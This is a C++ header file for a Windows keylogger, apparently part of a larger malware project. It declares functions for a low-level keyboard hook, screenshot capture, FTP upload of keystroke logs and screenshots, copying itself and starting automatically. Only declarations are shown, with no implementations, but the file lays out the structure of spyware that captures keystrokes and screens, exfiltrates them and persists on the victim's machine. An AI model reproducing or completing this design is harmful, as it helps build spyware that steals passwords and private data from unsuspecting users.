#ifndef BCKEYLOGGER_H
#define BCKEYLOGGER_H

#include <stdio.h>
#include <string>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <conio.h>
#include <time.h>
#include <fstream>
#include <strsafe.h>
#include <io.h>
#include <crtdefs.h>
#include <GdiPlus.h>

using namespace Gdiplus;
using namespace std;

void userpath();
string getTimeStr();
void setLogTime();
void screenshot();
int isCapsLock();
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
int StartKeyLogging();
void ftp_scrshot_send();
void ftp_log_send();
void AutoCopy();
void AutoStart();
void sendfileProcess();

#endif
